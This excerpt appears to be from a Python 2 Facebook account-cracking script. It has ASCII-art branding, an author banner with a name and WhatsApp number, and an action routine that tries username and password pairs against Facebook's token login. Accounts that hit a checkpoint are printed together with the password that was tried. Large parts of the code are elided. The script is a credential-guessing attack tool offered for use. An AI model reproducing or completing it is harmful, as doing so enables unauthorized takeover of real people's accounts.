...
HH   HH UU   UU MM    MM     44   YY   YY UU   UU         
HH   HH UU   UU MMM  MMM    444   YY   YY UU   UU  99999  
HHHHHHH UU   UU MM MM MM  44  4    YYYYY  UU   UU 99   99 
HH   HH UU   UU MM    MM 44444444   YYY   UU   UU  999999 
HH   HH  UUUUU  MM    MM    444     YYY    UUUUU      99  
                                                    999   
...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 HUM4YU9 K031R 💗
\x1b[1;91m➣ PGE NAME :  💣MD Humayun Kobir💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +880880580527 👬
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-HUM4YU9)💘💘💘━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://www.facebook.com/HUMAYUN.KOBIR.OFFICIAL.04')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[HUM4YU9-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
